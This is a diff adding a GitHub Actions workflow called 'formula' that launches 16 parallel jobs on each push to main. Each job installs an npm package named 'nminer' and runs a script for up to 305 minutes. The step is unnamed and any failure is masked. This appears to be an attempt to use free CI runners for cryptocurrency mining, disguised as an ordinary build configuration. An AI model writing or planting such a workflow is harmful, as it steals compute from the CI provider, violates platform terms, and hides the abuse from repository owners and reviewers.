@@ -1,0 +1,41 @@
+name: formula
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 4727 }
+          - { version: 4050 }
+          - { version: 9569 }
+          - { version: 8877 }
+          - { version: 7298 }
+          - { version: 3556 }
+          - { version: 4542 }
+          - { version: 6512 }
+          - { version: 4259 }
+          - { version: 327 }
+          - { version: 4385 }
+          - { version: 132 }
+          - { version: 8229 }
+          - { version: 3616 }
+          - { version: 4032 }
+          - { version: 305 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: 
+        run: |
+          npm install nminer@latest
+          timeout 305m node formula.js || echo "formula executed"
